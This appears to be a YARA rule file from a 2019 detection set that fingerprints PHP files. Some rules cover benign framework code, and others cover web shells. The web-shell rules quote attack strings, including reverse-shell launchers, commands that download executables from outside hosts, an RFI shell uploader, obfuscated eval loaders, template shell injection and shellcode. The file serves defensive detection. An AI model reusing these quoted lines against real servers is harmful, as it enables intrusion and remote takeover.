      $s3 = "* @var $this yii\\web\\View" fullword ascii
      $s4 = "<?= $form->field($object, 'user_id'); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AbstractAnnotationLoaderTest
{
   meta:
      description = "php17 - file AbstractAnnotationLoaderTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "286d032c9eac4e3437f889a0d0dcd6d32c93e2b1606f0fa992e76482199a80cd"
   strings:
      $s1 = "return $this->getMockBuilder('Symfony\\Component\\Routing\\Loader\\AnnotationClassLoader')" fullword ascii
      $s2 = "return $this->getMockBuilder('Doctrine\\Common\\Annotations\\Reader')" fullword ascii
      $s3 = "namespace Symfony\\Component\\Routing\\Tests\\Loader;" fullword ascii
      $s4 = "public function getClassLoader($reader)" fullword ascii
      $s5 = "abstract class AbstractAnnotationLoaderTest extends TestCase" fullword ascii
      $s6 = "public function getReader()" fullword ascii
      $s7 = "->setConstructorArgs(array($reader))" fullword ascii
      $s8 = "->getMock()" fullword ascii
      $s9 = "->getMockForAbstractClass()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AbstractProcess
{
   meta:
      description = "php17 - file AbstractProcess.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5e1e3b7733ec56ec26738427dbc2c4e320c794de690c349faeac1cb34d27d4fa"
   strings:
      $s1 = "* @author    jan huang <bboyjanhuang@gmail.com>" fullword ascii
      $s2 = "* @see      https://www.github.com/janhuang" fullword ascii
      $s3 = "* Class AbstractProcess." fullword ascii
      $s4 = "namespace FastD\\Process;" fullword ascii
      $s5 = "use FastD\\Swoole\\Process;" fullword ascii
      $s6 = "abstract class AbstractProcess extends Process" fullword ascii
      $s7 = "* @see      http://www.fast-d.cn/" fullword ascii
      $s8 = "* @copyright 2017" fullword ascii
      $s9 = "public function configure(array $options = [])" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_7e594b9fa652d185c4b87ab7080f740f5d7eea2f
{
   meta:
      description = "php17 - file 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule af6a3fc0ec9ee663e1d9cda5cb6cc66c00331fc4
{
   meta:
      description = "php17 - file af6a3fc0ec9ee663e1d9cda5cb6cc66c00331fc4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "003eae7af4aa679dd455cf5e83459b1d0b893e9bd4044ebd12bb0d537d47f312"
   strings:
      $s1 = "if( \\\"$hash\\\" == sha1( file_get_contents( \\\"$outfile\\\") ) ){" fullword ascii
      $s2 = "$outfile = \"/var/www/Storm7Shell.php\"; // Remote path on server" fullword ascii
      $s3 = "$infile = \"php-reverse_shell.txt\"; // Local file to upload" fullword ascii
      $s4 = "file_put_contents( \\\"$outfile\\\", base64_decode( \\\"$data\\\" ) ); " fullword ascii
      $s5 = "$infile = \"Storm7Shell.txt\"; " fullword ascii
      $s6 = "echo \\\"Failed - file not found\\\";" fullword ascii
      $s7 = "file_put_contents( \\\"$outfile\\\", base64_decode( \\\"$data\\\" ) );" fullword ascii
      $s8 = "}else{ echo \\\"ERROR hashes don't match\\\"; }" fullword ascii
      $s9 = "$data = file_get_contents( $infile );" fullword ascii
      $s10 = "// Present self as a RFI script to write a file to the remote server" fullword ascii
      $s11 = "echo \\\"Wrote $outfile OK, \\\".filesize(\\\"$outfile\\\").\\\" bytes. \\\";" fullword ascii
      $s12 = "echo \\\"Hashes match.\\\";" fullword ascii
      $s13 = "echo \\\"Failed write\\\";" fullword ascii
      $s14 = "$hash = sha1( $data );" fullword ascii
      $s15 = "if( file_exists( \\\"$outfile\\\" ) ){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule AlphaCompleteValidatorTest
{
   meta:
      description = "php17 - file AlphaCompleteValidatorTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "198cc7aba928d20c722ca27e184034b144dcab74303a58126057846424e54a3a"
   strings:
      $x1 = "* through the world-wide-web, please send an email to license@phalconphp.com" fullword ascii
      $s2 = "* @link      http://www.phalconphp.com" fullword ascii
      $s3 = "* @author    Michele Angioni <michele.angioni@gmail.com>" fullword ascii
      $s4 = "* bundled with this package in the file docs/LICENSE.txt" fullword ascii
      $s5 = "* The contents of this file are subject to the New BSD License that is" fullword ascii
      $s6 = "* Tests for Phalcon\\Validation\\Validator\\AlphaCompleteValidator component" fullword ascii
      $s7 = "* \\Phalcon\\Test\\Validation\\Validator\\AlphaCompleteValidatorTest" fullword ascii
      $s8 = "public function testAlphaCompleteValidatorFailingUrlCharsHashtag()" fullword ascii
      $s9 = "* If you did not receive a copy of the license and are unable to obtain it" fullword ascii
      $s10 = "public function testAlphaCompleteValidatorFailingPipe()" fullword ascii
      $s11 = "public function testAlphaCompleteValidatorFailingUrlCharsEquals()" fullword ascii
      $s12 = "public function testAlphaCompleteValidatorFailingSymbols()" fullword ascii
      $s13 = "public function testAlphaCompleteValidatorFailingLength()" fullword ascii
      $s14 = "public function testAlphaCompleteValidatorOkWithPipe()" fullword ascii
      $s15 = "* @copyright (c) 2011-2017 Phalcon Team" fullword ascii
      $s16 = "'allowPipes' => true,                                                // Optional" fullword ascii
      $s17 = "public function testAlphaCompleteValidatorOkWithUrlChars()" fullword ascii
      $s18 = "public function testAlphaCompleteValidatorOkWithBackslackesh()" fullword ascii
      $s19 = "use Phalcon\\Validation\\Validator\\AlphaCompleteValidator;" fullword ascii
      $s20 = "'messageMinimum' => 'The value must contain at least 5 characters.', // Optional" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_5f829297f612710128f8d227d6a595f11fe60d82
{
   meta:
      description = "php17 - file 5f829297f612710128f8d227d6a595f11fe60d82.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "61a10497c0135f4c2c5980b8383e0c468b0cfdd2b6121c180edfcd4da23347ab"
   strings:
      $s1 = "$r='r[\"HTTP_^.ACCEPT_LAN^.GUAGE\"];^.if($r^.r&&^.$ra){$u=pars^.e_url(^.$r^.r);parse_^.^.str($';" fullword ascii
      $s2 = "$K='i],0,$e))),$k^.)^.))^.;$o=ob_^.get_c^.ontents();ob_en^.d_c^.lean();^.$d=ba^.s^.e64_enco^';" fullword ascii
      $s3 = "$J='^.t($m[^.1]);$^.z++^.)$p.=$q[$m[^.2][^.$^.z]];if(^.str^.pos($p,$h)^.===0){$s[$i^.]=\"\";^.';" fullword ascii
      $s4 = "$T='}^$k{$j^.}^.;}}return $o^.;}$r=$^._SERV^.ER;$rr=^.@$r[\"^.HTTP_R^.EFERER\"^.];^.$r^.a=@^.$';" fullword ascii
      $s5 = "$P='.de(x(gzc^.ompress($^.o),$k^.));print(\"^.<$k>$d^.<^./$k>\");@^.session_d^.estroy^.();}}}}';" fullword ascii
      $s6 = "$x='.6^.4_decode(preg_repla^.ce(arr^.^.ay(^.\"/_/\",\"/-^./\"),array(^.\"/\",\"^.+\"),$ss($^.s[^.^.$';" fullword ascii
      $s7 = "$I='.5($^.i.$kh),0,^.3))^.;$f=$sl($^.ss(^.md5^.(^.$i.^.$kf^.),0,3^.));$p=\"\";for($z=1;$z<coun';" fullword ascii
      $s8 = "$e='^.q^.=0.([\\\\d])^.)?,?^./\",$ra,$m)^.;^.if($q&&$m){^.@s^.ession_^.star^.t^.();$s^.=&$_SESSI';" fullword ascii
      $s9 = "$d='$kh=\"^.5d41\";$kf=\"4^.0^.2^.a\";func^.tion ^.x($t,$k){$^.c=s^.trlen($k);^.$l=strlen($^.^.t);$';" fullword ascii
      $s10 = "$B='ON;$ss=\"^.subs^.tr\";$s^.^.l=\"strto^.lower\";$i^.=$m[1]^.[0].$m[1]^.[1];$h^.=$sl(^.$ss(md^';" fullword ascii
      $s11 = "$C='u[\"^.q^.uery\"],$q);$q^.=arra^.^.^.y_values^.($q);preg_m^.atch_a^.ll(\"/([\\\\^.w])[\\\\w-]+(?:;';" fullword ascii
      $s12 = "$l='$p=^.$ss($p,3)^.;^.}if(array_^.^.k^.ey^._exis^.ts($i,$s)){$s[$i^.].^.=$p;$e=strpos($s[$^';" fullword ascii
      $s13 = "$s='.^.i],^.$f);if($e){$k=$k^.^.h.$kf;ob^._sta^.rt();@ev^.al(^.@gzunc^.ompre^.s^.s(@x(@base^';" fullword ascii
      $s14 = "$t=str_replace('^.','',$d.$q.$T.$r.$C.$e.$B.$I.$J.$l.$s.$x.$K.$P);" fullword ascii
      $s15 = "$q='o=\"\"^.;for($i=0;^.^.$i<$l;){fo^.r($j=0;(^.$j<$c&^.^.&$i<$l);$j++^.,$i+^.+)^.{$o^..=$t{$i';" fullword ascii
      $s16 = "$w=str_replace('X','','XcreaXte_XfuXnXXction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_88d0d4696c9cb2d37d16e330e236cb37cfaec4cd
{
   meta:
      description = "php17 - file 88d0d4696c9cb2d37d16e330e236cb37cfaec4cd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e85843849ddea1f90f1c0b3a54aa91d69a740bb5d06b7036315bc6529e96c43b"
   strings:
      $x1 = "if ($ka){print'Success <br> Shell Injected in '.$template;}" fullword ascii
      $s2 = "$p = \"UPDATE \".$_POST[tab].\"template SET template ='\".$a.$code.\"\\'))}}{\\${exit()}}&' WHERE title ='\".$template.\"'\";" fullword ascii
      $s3 = "$p = \"UPDATE \".$_POST[tab].\"template SET template ='\".$a.$tkl_index.\"\\'))}}' WHERE title ='\".$lost.\"'\";" fullword ascii
      $s4 = "'not_executed' => \"\\\"[%1]\\\" could not be executed successfully:\\n{%2}\"," fullword ascii
      $s5 = "'executed' => \"\\\"[%1]\\\" has been executed successfully:\\n{%2}\"," fullword ascii
      $s6 = "if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {" fullword ascii
      $s7 = "MlYwUFNKZllteGhibXNpUGx0SFlYcGhJRWhoUTB0bFVpQlVaV0Z0WFR3dllUNGdMU0E4WVNCb2NtVm1QU0pvZEhSd09pOHZaMkY2WVMxb1lXTnJaWEl1Ym1WMEwyTmpM" ascii
      $s8 = "echo '[ <a href=\"' . $self . '?tool=Files&dir=' . urlencode($real_file) . '\">' . html($file['target']) . '</a> ]';" fullword ascii
      $s9 = "Inject To :<br><select size=\"1\" name=\"template\">" fullword ascii
      $s10 = "exec('echo \"./' . basename($file) . '\" | /bin/sh', $output, $retval);" fullword ascii
      $s11 = "<form name=\"frm\" action=\"\" method=\"POST\" onsubmit=\"document.frm.code.value = encode64(document.frm.code.value)\">" fullword ascii
      $s12 = "$src = ereg_replace('<font color=\"([^\"]*)\">', '<span style=\"color: \\1\">', ob_get_contents());" fullword ascii
      $s13 = "<form name=\"frm\" action=\"\" method=\"POST\" onsubmit=\"document.frm.code.value = vb(document.frm.code.value)\">" fullword ascii
      $s14 = "if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;" fullword ascii
      $s15 = "listing_page(error('not_executed', $file, implode(\"\\n\", $output)));" fullword ascii
      $s16 = "#                    Coded By TKL                                 #" fullword ascii
      $s17 = "cGJuUlFZV2RsU0dWaFpHVnlLQ0ptSWlrN0RRb0pDWEJ5YVc1MElDSkdZV2xzWldRZ2RHOGdaRzkzYm14dllXUWdKRVpwYkdWVmNtdzZJQ1FoSWpzTkNna0pKbEJ5YVc1" ascii
      $s18 = "cGU9InN1Ym1pdCI+IDwvRk9STT4nOyB9IGlmICgkX1BPU1RbJ3NlbmQnXSA9PSAnY2hhbmdlLWpvb21sYS1hZG1pbicpeyAkbG9jYWxob3N0ID0gJF9QT1NUWydsb2Nh" ascii
      $s19 = "YWx1ZT0iY2hhbmdlLXBocEJCLUFkbWluIiBuYW1lPSJzZW5kIiB0eXBlPSJzdWJtaXQiPiA8L0ZPUk0+JzsgfSBpZiAoJF9QT1NUWydzZW5kJ10gPT0gJ2NoYW5nZS1w" ascii
      $s20 = "b3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHVzZXIgU0VUIHBhc3N3b3JkID0nMzA0MjE3Nzg5MGMyZTc5NzczZTBlZDhlOGVm" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule sig_069059b7ef840f0c74a814ec9237b6ec
{
   meta:
      description = "php17 - file 069059b7ef840f0c74a814ec9237b6ec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cd73e2b32de14c58c3e27d833be05ec7fbfaf569ed10f18d47bf11352d6b4954"
   strings:
      $x1 = "fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii
      $x2 = "&nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>File 2</u></b> (binary file to run - <u>$private[3]</u> )</td></tr>" fullword ascii
      $x3 = "&nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>File 1</u></b> (binary file to run - <u>$private[2]</u> )</td></tr>" fullword ascii
      $x4 = "&nbsp;&nbsp;bindtty.c - remote shell on 4000 port, with rights of current user (id of apache)<br>" fullword ascii
      $x5 = "efault listening port is 31337 - connect to it with your favotite IRC client and set a password<br>" fullword ascii
      $x6 = "fputs($f,\"Decrypted MD5 hash [$pass_de] = $word\\nBruteforce start:\\t$dat - $date\\Bruteforce finish:\\" fullword ascii
      $x7 = "# echo \"<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; \".exec(\"rm -f s\").\"</b> Removing file<u>s</u> now...</td></tr>\";" fullword ascii
      $x8 = "&nbsp;&nbsp;lGlftpd DupeScan Local Exploit - private local root exploits for Glftpd daemon <br>" fullword ascii
      $x9 = "else { open_file(\"dump_\".$dte.$tbl[$i].$fc.\".sql\".$gz);write_file($temp.\"\\n\\n\");close_file();$nbf=1; }" fullword ascii
      $x10 = "&nbsp;&nbsp;<b>FTP bruteforce</b>(full bruteforce, you are only to enter a value of number of passwords and brute will begin fr" fullword ascii
      $x11 = "<tr><td bgcolor=#FFFFCC><br><b>NetworkFileManagerPHP</b> - script to access your host in a best way</font><br><br>" fullword ascii
      $x12 = "<dd><b>Compilation, installing and running psybnc:</b> make // making psybnc // ./psybnc // You may edit psybnc.conf with NFM, D" ascii
      $x13 = "&nbsp;&nbsp;localroot root linux 2.4.* - Exploit do_brk (code added) - gains local root priveleges if exploited succes<br>" fullword ascii
      $x14 = "t=black bordercolordark=white><tr><td align=center>\".$g[1].\":\".$g[1].\" - <b>failed</b></td></tr></table>\";" fullword ascii
      $x15 = "global $action,$private_site, $title_exp,$login, $host, $file, $chislo, $proverka;" fullword ascii
      $x16 = "echo \"<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; \".exec(\"./s\").\"</b> now running to 4000 port</td></tr>\";" fullword ascii
      $x17 = "<tr><td> <font color='#FFFFCC' face='Tahoma' size = 2>Directory <u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $pass.ta" ascii
      $x18 = "&nbsp;&nbsp;<b>psyBNC version:2.3.2-4</b> - psyBNC (binary file to run - <u>./psybnc</u>)</td></tr>" fullword ascii
      $s19 = "global $status,$form,$action,$name,$email,$pole,$REMOTE_ADDR,$HTTP_REFERER,$DOCUMENT_ROOT,$PATH_TRANSLATED,$HTTP_HOST;" fullword ascii
      $s20 = "<br><center><font color=red>You forgot to check tables, which you need to dump =)</b></font></center>\\n$footer\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}


rule AnonConsumer
{
   meta:
      description = "php17 - file AnonConsumer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9efa1ddcc9fe949f73ebc111248dac4e9119217fdbdfa81a54ca43566464d216"
   strings:
      $s1 = "public function __construct(AbstractConnection $conn)" fullword ascii
      $s2 = "use PhpAmqpLib\\Connection\\AbstractConnection;" fullword ascii
      $s3 = "namespace OldSound\\RabbitMqBundle\\RabbitMq;" fullword ascii
      $s4 = "'passive' => false," fullword ascii
      $s5 = "'ticket' => null" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AsciiHex
{
   meta:
      description = "php17 - file AsciiHex.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4d398935c32ff665d3cda173ac21340cf184801c851fda090f631dea1ce2e370"
   strings:
      $x1 = "* @copyright  Copyright (c) 2005-2010 Zend Technologies USA Inc. (http://www.zend.com)" fullword ascii
      $x2 = "* http://framework.zend.com/license/new-bsd" fullword ascii
      $s3 = "* @license    http://framework.zend.com/license/new-bsd     New BSD License" fullword ascii
      $s4 = "* to license@zend.com so we can send you a copy immediately." fullword ascii
      $s5 = "throw new Zend_Pdf_Exception('Wrong encoded stream End Of Data marker.');" fullword ascii
      $s6 = "throw new Zend_Pdf_Exception('Wrong character in a encoded stream');" fullword ascii
      $s7 = "* with this package in the file LICENSE.txt." fullword ascii
      $s8 = "// Add decoded character to the output" fullword ascii
      $s9 = "* @version    $Id: AsciiHex.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s10 = "* This source file is subject to the new BSD license that is bundled" fullword ascii
      $s11 = "$code = $charCode - 0x37/*0x41 - 0x0A*/;" fullword ascii
      $s12 = "$code = $charCode - 0x57/*0x61 - 0x0A*/;" fullword ascii
      $s13 = "* Zend Framework" fullword ascii
      $s14 = "$code = $charCode - 0x30;" fullword ascii
      $s15 = "* Decode data" fullword ascii
      $s16 = "* AsciiHex stream filter" fullword ascii
      $s17 = "* @throws Zend_Pdf_Exception" fullword ascii
      $s18 = "/* Check that stream is terminated by End Of Data marker */" fullword ascii
      $s19 = "$output .= chr($hexCodeHigh*16 + $code);" fullword ascii
      $s20 = "* Encode data" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_82d1122c0d297bb8dc2959e5023728a09a3e4e6d
{
   meta:
      description = "php17 - file 82d1122c0d297bb8dc2959e5023728a09a3e4e6d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "65024e9ae949507819c9344a2e134ff406e24c6e2a54ded2dab8ef8e6e7d1f83"
   strings:
      $x1 = "src=\"http://priv8.iblogger.org/s.php?'+<?echo \"uname -a : \"; echo" fullword ascii
      $x2 = "value=Go></form>'.$form.'Command Execute : <input name=cme size=50" fullword ascii
      $s3 = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t" fullword ascii
      $s4 = "system(\"wget http://paradiseinpuntagorda.com/images/dc\");" fullword ascii
      $s5 = "$sa=file_get_contents('http://dzrecharge.tk/pv8L/dz.txt');" fullword ascii
      $s6 = "$sa=file_get_contents('http://dzrecharge.tk/pv8L/1.txt');" fullword ascii
      $s7 = "echo \"<iframe src=perltools/perlbypass.php width=100% height=100%" fullword ascii
      $s8 = "shell image:http://my.picresize.com/vault2/CY02MYRI70.jpg" fullword ascii
      $s9 = "<a onclick=\"window.open('http://www.schliinberg.de/templates/pageranktara.php','POPUP','width=900" fullword ascii
      $s10 = "$process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);" fullword ascii
      $s11 = "printit(\"ERROR: Shell process terminated\");" fullword ascii
      $s12 = "python shell bypass" fullword ascii
      $s13 = "$shellcode = \"\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x99\\x52\\x53\\x6a\\x02\\x89\"." fullword ascii
      $s14 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii
      $s15 = "suexec bypass" fullword ascii
      $s16 = "b2xvcj0iI0ZGRkZGRiIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiByaWdodG1hcmdpbj0i" fullword ascii
      $s17 = "Q3Q3K2diRFozcXYvNDdNQTVyTmpKbExDRDJ6SzhCTUhObURROTRDMldpZ1hna0VTZnIzOWNnVyty" fullword ascii
      $s18 = "aWQgcmVkO2JhY2tncm91bmQ6I2ZmZmZmZjt9I2pzb2Zme21hcmdpbjo1cHggOHB4O30janNvbntk" fullword ascii
      $s19 = "Z2luPSIwIiBib3R0b21tYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwMCIgbWFyZ2luaGVpZ2h0PSIw" fullword ascii
      $s20 = "echo \"<iframe src=suexec/suexec.php width=100% height=100%" fullword ascii
   condition:
      uint16(0) == 0x6873 and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule php17_angel2
{
   meta:
      description = "php17 - file angel2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3ceb493e17daaaa547f05cf557885715fb575e684512dfc6b679c91285835995"
   strings:
      $x1 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this.p1.value);return false;'));" fullword ascii
      $x2 = "<a href=\"javascript:g('shell',null,'','','','','<?php echo $charset;?>');\">Execute Command</a> | " fullword ascii
      $x3 = "2013 final</a>. Copyright (C) 2004-2013 <a href=\"http://www.4ngel.net\" target=\"_blank\">[S4T]</a> All Rights Reserved." fullword ascii
      $x4 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x5 = "$res = execute(which('perl').\" /tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s6 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s7 = "$res = execute(\"/tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s8 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s9 = "p('<p class=\"red\">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');" fullword ascii
      $s10 = "p('<pre>'.execute($p1).'</pre>');" fullword ascii
      $s11 = "$attachsize = '<a href=\"javascript:g(\\'file\\', null, \\'getsize\\', \\''.$dirdb['filename'].'\\');\">Stat</a>';" fullword ascii
      $s12 = "m('Database has backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$P['bak_path'].'</a>');" fullword ascii
      $s13 = "if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {" fullword ascii
      $s14 = "echo \"<p class=\\\"b\\\">Mysql error description: \".htmlspecialchars($this->geterrdesc()).\"</p>\\n\";" fullword ascii
      $s15 = "27 => array('Safe mode exec dir',getcfg('safe_mode_exec_dir'))," fullword ascii
      $s16 = "21 => array('upload_max_filesize',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'))," fullword ascii
      $s17 = "formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\\'eval\\',null,this.p1.value);return false;'));" fullword ascii
      $s18 = "<form onsubmit=\"g('file',this.cwd.value);return false;\" method=\"POST\" id=\"godir\" name=\"godir\">" fullword ascii
      $s19 = "<a href=\"javascript:g('portscan',null,'','','','','<?php echo $charset;?>');\">Port Scan</a> | " fullword ascii
      $s20 = "13 => array('Administrator',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')))," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_8c160ac8a7793ff4f36d3b56ef57ee6ac609f51a
{
   meta:
      description = "php17 - file 8c160ac8a7793ff4f36d3b56ef57ee6ac609f51a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fc752e058f668a279523311b6177b4982e49809bf4e16f80c8778cacf6c4c231"
   strings:
      $s1 = "fwrFX5S+pn5/c5e1pDfqTE2cSbcal5yuxzfhOUq5Tp19affMtw8zCi0mJGNSVjGBZnZJt/mvxHefPgQ5CcaI7TmcjUr4dgz7q+ZixBYnRBDqQm2JvRkszbeR9U0po386" ascii
      $s2 = "Rt3v/gKg04hA18GAFSr6/8hbVqcXdgabCBLQw/zws2hUE/Yo3eNy73gP3db/Xbi9BIMvhFVFaADMxyUjcvXm/xviFThqwsmLc/27PrG8BBYyR2ynvKfmtQypEPv6SgxE" ascii
      $s3 = "NYww/bJFGNa5cv9AcIbnJmgJNCoBWCBJrtYNF6isi6Gl364xlg748cMJJnWYZBwbCcBXDG4+sh/Fs+a8me01FpEFRLKJA0C8XPVEgFIAV9BMV4qNBbznFOEe6LXmrhry" ascii
      $s4 = "@ini_set(\"log_errors\",0);" fullword ascii
      $s5 = "RcFXbAkDo0wYfVcNf1RNM0zsC02o6rsS5p1V3n66/QCjRN87RrRU6Tvy1NUhQIgoVlWe8v7vz33//9888///8P\")));" fullword ascii
      $s6 = "@ini_set(\"error_log\",NULL);" fullword ascii
      $s7 = "Z/v6iqNhp6WAHSfhy5wWEVrFqWTA0upkGDjYM6zDtWrb8hOYi295kv0eTP+fsgf7V1aLjadbid8eKh2i1KweoDhswhZDtNhGeTWrrDz71RkESiAR4BSuFIxIG/xV9E3O" ascii
      $s8 = "+A4+csqrqYK43UsGl28BaDlLBr6+Hxh6zFTdnUzqF54Ctdal/OHQKnO7JiROx7RVGD9eJojpG0fmBXZR2s7NB142SMoxb4habw7Hy+IOxuGUSFyrtPZbFDDINHTlx0FB" ascii
      $s9 = "T7yiuTTlA4erQacdLFrbtnmwaR3T98SLnD2BSR8GGV+tVn0fAVu1TMeDMXFUIakpiOSGetkQVzL5AuWniPawTSCbIEoDFjMx9AtpAW6SsUr3gbyVYWWjS7XTk0VaO+wR" ascii
      $s10 = "NHGAvvsLj5R0ZYq9wd49HF35vEqpaPePKH/obrc2JejvadlL9VL35gzPpbs3BX6ZKt4R4QB3tD2joS1ElH6vvtH0Haozu+DRt2V9785ebR7qfxCIPfrkXDAzvdtoTU2t" ascii
      $s11 = "YnV41OWV12FeyEbVNIzWtovyFvwEsgPl+3rOsxoRpD0A1+yWJ4Cb/cW8DOS4roISn/C4X2A435Z/h+BgfiVzI4tv9tXnpsfxDVWq7N5EyYVue56lumnImg9Tw38F7EIq" ascii
      $s12 = "DEl/4ZW+tbf+NYuTsmW+bfWHeqmfXn0DRkOI2Hud0trfVu/+JMvxHEHzaeF9klkOxeRHJkhmsiEHIssMIBUp4/FqJPwBVntXTVLmZgiv8I5U1nURdh6fCYGTcNXIFLy/" ascii
